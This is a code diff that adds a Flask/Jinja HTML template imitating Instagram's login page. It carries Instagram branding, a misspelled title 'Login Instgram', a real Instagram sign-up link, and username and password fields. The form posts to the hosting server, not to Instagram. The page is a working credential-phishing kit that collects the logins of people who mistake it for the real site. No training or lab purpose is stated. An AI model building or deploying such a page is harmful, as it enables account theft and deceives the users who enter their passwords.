@@ -1,0 +1,71 @@
+{% block body %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Login Instgram</title>
+	<link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+</head>
+<body>
+
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<img src="{{ url_for('static', filename='assist/instagram.png') }}" alt="instagram" style="width: 175px;">
+			</div>
+
+
+			<form class="form" id="indexForm" action = "/" method = 'post' data-sb-form-api-token="API_TOKEN">
+                <div class="input_field">
+                    <input class="input" name = 'email' id="name" type="text" required placeholder="Phone number, username, or email" data-sb-validations="required" />
+                </div>
+                <div class="input_field">
+                	<input class="input" name = 'password' id="email" type="password" required placeholder="Password" data-sb-validations="required,Password" />
+                </div>
+                <!-- <div class="btn" type="submit"><a href="#" type="submit">Log In</a></div> -->
+                <button class="btn" id="submitButton" type="submit">Log In</button>
+            </form>
+			<div class="or">
+				<div class="line"></div>
+				<p>OR</p>
+				<div class="line"></div>
+			</div>
+			<div class="dif">
+				<div class="fb">
+					<img src="{{ url_for('static', filename='assist/facebook.png') }}" alt="facebook">
+					<p>Log in with Facebook</p>
+				</div>
+				<div class="forgot">
+					<a href="#">Forgot password?</a>
+				</div>
+			</div>
+		</div>
+		<div class="signup">
+			<p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+		</div>
+		<div class="apps">
+			<p>Get the app.</p>
+			<div class="icons">
+				<a href="#"><img src="{{ url_for('static', filename='assist/appstore.png') }}" alt="appstore"></a>
+				<a href="#"><img src="{{ url_for('static', filename='assist/googleplay.png') }}" alt="googleplay"></a>
+			</div>
+		</div>
+	</div>
+	<div class="footer">
+		<div class="links">
+			<ul>
+				<li><a href="#">ABOUT US</a></li>
+				<li><a href="#">PRIVACY</a></li>
+				<li><a href="#">TERMS</a></li>
+			</ul>
+		</div>
+		<div class="copyright">
+			© 2022 INSTA
+		</div>
+	</div>
+</div>
+
+</body>
+</html>
+{% endblock %}
